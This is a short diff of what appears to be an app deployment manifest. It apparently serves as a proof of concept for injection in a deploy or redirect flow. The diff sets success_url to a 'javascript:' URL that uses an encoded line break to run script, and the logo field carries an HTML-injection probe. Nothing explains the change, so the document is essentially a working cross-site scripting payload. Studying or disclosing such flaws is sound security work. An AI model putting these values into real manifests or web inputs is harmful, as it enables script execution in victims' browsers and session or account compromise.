@@ -10,7 +10,7 @@
   "website": "https://small-sharp-tool.com/xxxxxxxxxxx",
   "repository": "https://github.com/jane-doe/xxxxxxxxxx",
   "logo": "https://xxxxxx'\"><s>xxx</s>-sharp-tool.com/logo.svg",
-  "success_url": "/welcome/xxxxxxxxxxx",
+  "success_url": "javascript://evil.com/%0d%0aalert(origin)//",
   "scripts": {
     "postdeploy": ""
   },
